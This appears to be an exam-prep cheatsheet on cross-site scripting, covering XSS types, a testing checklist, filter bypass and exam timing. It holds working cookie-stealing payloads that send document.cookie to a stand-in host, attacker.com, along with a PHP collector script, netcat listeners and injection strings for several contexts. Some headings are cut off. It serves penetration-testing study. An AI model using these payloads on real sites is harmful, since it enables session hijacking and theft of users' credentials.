    Cross-Site Scripting (XSS)

    Overview

    Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. This cheatsheet covers practical XSS techniques for exam scenarios.

    Quick Detection Checklist

    • [ ] Test all input fields (search, comments, forms)
    • [ ] Check URL parameters and fragments
    • [ ] Test HTTP headers (User-Agent, Referer, Cookie)
    • [ ] Look for reflected input in HTML, JavaScript, attributes
    • [ ] Check for stored XSS in profiles, comments, messages
    • [ ] Test file upload features (filename, content)
    • [ ] Examine DOM-based sinks (innerHTML, eval, document.write)

    XSS Types

    1. Reflected XSS

    Payload is reflected immediately in the response 

    Victim clicks malicious link → Server reflects payload → Executes in browser

    2. Stored XSS

    Payload is stored on server and served to multiple users 

    Attacker stores payload → Server saves to database → Other users view page → Executes

    3. DOM-Based XSS

    Payload executes through DOM manipulation 

    Payload in URL fragment → JavaScript processes it → Executes without server interaction

    -Specific Exploitation

    1. Cookie Stealing

    Basic Cookie Stealer: 

    <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>

    Setup Listener: 

    # Python HTTP Server with logging
python3 -m http.server 80

# Netcat listener
nc -lvnp 80

# PHP cookie stealer (steal.php)
<?php
$cookie = $_GET['c'];
file_put_contents('cookies.txt', $cookie . "\n", FILE_APPEND);
?>

    2. Session Hijacking

    // Steal session token
<script>

    Testing Methodology

    Step 1: Map Input Points

    # Identify all input vectors
- URL parameters: ?id=, ?search=, ?page=
- POST body parameters
- HTTP headers
- File uploads (filename, metadata)
- JSON/XML payloads
- Cookies

    Step 2: Test Basic Payloads

    # Start simple
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# Check response for:
- Is input reflected?
- What context (HTML/JS/attribute)?
- Are characters filtered/encoded?

    Step 3: Determine Context

    # HTML Context
- Payload appears in <body>, <div>, <p>, etc.
- Use: <script>, <img>, <svg>

# Attribute Context  
- Payload inside: <input value="HERE">
- Use: " onerror="alert(1)

# JavaScript Context
- Payload inside: var x = 'HERE';
- Use: '; alert(1); //

    Step 4: Bypass Filters

    # Test if filters exist:
1. Try <script> - blocked?
2. Try <img> - blocked?
3. Try encoding - works?
4. Try case variation - works?
5. Try alternative tags

    Step 5: Craft Final Exploit

    # Create working payload that:
- Bypasses all filters
- Executes in correct context
- Achieves objective (steal cookie, etc.)

    Exam Strategy

    • 5 min: Identify all input points
    • 10 min: Test basic XSS payloads
    • 15 min: Bypass filters if needed
    • 10 min: Craft working exploit
    • 10 min: Document for report

    Checklist During Exam

    1. Initial Testing
    2. [ ] Test all GET parameters
    3. [ ] Test all POST parameters
    4. [ ] Test search functionality
    5. [ ] Test comment sections

    6. [ ] Test user profile fields

    7. Context Detection

    8. [ ] View page source
    9. [ ] Find where input is reflected
    10. [ ] Determine context (HTML/JS/attribute)

    11. [ ] Note any encoding/filtering

    12. Exploitation

    13. [ ] Start with simple alert(1)
    14. [ ] If blocked, try bypass techniques
    15. [ ] Craft final payload
    16. [ ] Test payload works

    17. [ ] Capture evidence (screenshots)

    18. Documentation

    19. [ ] Save payload that worked
    20. [ ] Screenshot showing XSS execution
    21. [ ] Note injection point
    22. [ ] Document steps to reproduce

    Pro Tips for

    Quick Wins

    • Always try <script>alert(1)</script> first
    • If filtered, immediately try <img src=x onerror=alert(1)>
    • Check if input is reflected in multiple places
    • Test URL parameters even if no visible input field
    • Don't spend too long on one XSS - move on if stuck

    Common Mistakes

    • Not URL-encoding payloads in GET parameters
    • Forgetting to check where input is reflected
    • Not testing all input fields
    • Giving up too early on filter bypass
    • Not documenting findings properly

    Exam Restrictions

    • Don't attack other students
    • Only test on your assigned targets
    • Keep payloads non-destructive
    • Document everything for the report
